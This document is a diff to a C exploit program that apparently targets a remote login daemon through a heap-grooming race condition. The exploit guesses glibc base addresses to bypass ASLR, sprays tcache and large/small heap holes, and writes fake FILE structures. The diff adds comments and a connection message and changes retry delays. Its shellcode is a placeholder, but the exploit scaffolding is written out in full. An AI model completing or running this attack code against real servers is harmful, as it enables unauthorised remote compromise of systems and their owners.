@@ -9,16 +9,16 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
-#include <time.h>
 
 #define MAX_PACKET_SIZE (256 * 1024)
 #define LOGIN_GRACE_TIME 120
-#define MAX_STARTUPS 100
 #define CHUNK_ALIGN(s) (((s) + 15) & ~15)
 
-uint64_t GLIBC_BASES[] = { 0xb7200000, 0xb7400000 };
+// Possible glibc base addresses for ASLR bypass
+uint64_t GLIBC_BASES[] = {0xb7200000, 0xb7400000};
 int NUM_GLIBC_BASES = sizeof(GLIBC_BASES) / sizeof(GLIBC_BASES[0]);
 
+// Placeholder shellcode
 unsigned char shellcode[] = "\x90\x90\x90\x90";
 
 int setup_connection(const char *ip, int port);
@@ -36,7 +36,6 @@ int main(int argc, char *argv[]) {
 
     const char *ip = argv[1];
     int port = atoi(argv[2]);
-    double parsing_time = 0;
     int success = 0;
 
     srand(time(NULL));
@@ -58,7 +57,7 @@ int main(int argc, char *argv[]) {
 
             prepare_heap(sock);
 
-            if (attempt_race_condition(sock, parsing_time, glibc_base)) {
+            if (attempt_race_condition(sock, 0.0, glibc_base)) {
                 printf("Possible exploitation success on attempt %d with glibc base 0x%lx!\n", attempt, glibc_base);
                 success = 1;
                 break;
@@ -83,6 +82,7 @@ int setup_connection(const char *ip, int port) {
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(port);
+
     if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
         perror("inet_pton");
         close(sock);
@@ -98,6 +98,7 @@ int setup_connection(const char *ip, int port) {
     int flags = fcntl(sock, F_GETFL, 0);
     fcntl(sock, F_SETFL, flags | O_NONBLOCK); // Non-blocking mode
 
+    printf("Connection established to %s:%d\n", ip, port);
     return sock;
 }
 
@@ -108,7 +109,7 @@ void send_packet_retry(int sock, const unsigned char *data, size_t len) {
         if (sent > 0) {
             total_sent += sent;
         } else if (sent < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
-            usleep(1000); // Wait 1ms and retry
+            usleep(5000); // Wait 5ms and retry
             continue;
         } else {
             perror("send_packet");
@@ -118,12 +119,14 @@ void send_packet_retry(int sock, const unsigned char *data, size_t len) {
 }
 
 void prepare_heap(int sock) {
+    // Packet a: Allocate and free tcache chunks
     for (int i = 0; i < 10; i++) {
         unsigned char tcache_chunk[64];
         memset(tcache_chunk, 'A', sizeof(tcache_chunk));
         send_packet_retry(sock, tcache_chunk, sizeof(tcache_chunk));
     }
 
+    // Packet b: Create 27 pairs of large (~8KB) and small (320B) holes
     for (int i = 0; i < 27; i++) {
         unsigned char large_hole[8192];
         memset(large_hole, 'B', sizeof(large_hole));
@@ -134,12 +137,14 @@ void prepare_heap(int sock) {
         send_packet_retry(sock, small_hole, sizeof(small_hole));
     }
 
+    // Packet c: Write fake headers, footers, and pointers
     for (int i = 0; i < 27; i++) {
         unsigned char fake_data[4096];
         create_fake_file_structure(fake_data, sizeof(fake_data), GLIBC_BASES[0]);
         send_packet_retry(sock, fake_data, sizeof(fake_data));
     }
 
+    // Packet d: Ensure malloc bins are correctly aligned
     unsigned char large_string[MAX_PACKET_SIZE - 1];
     memset(large_string, 'E', sizeof(large_string));
     send_packet_retry(sock, large_string, sizeof(large_string));
@@ -204,7 +209,7 @@ int attempt_race_condition(int sock, double parsing_time, uint64_t glibc_base) {
         if (sent > 0) {
             total_sent += sent;
         } else if (sent < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
-            usleep(1000);
+            usleep(5000);
             continue;
         } else {
             perror("send_packet");
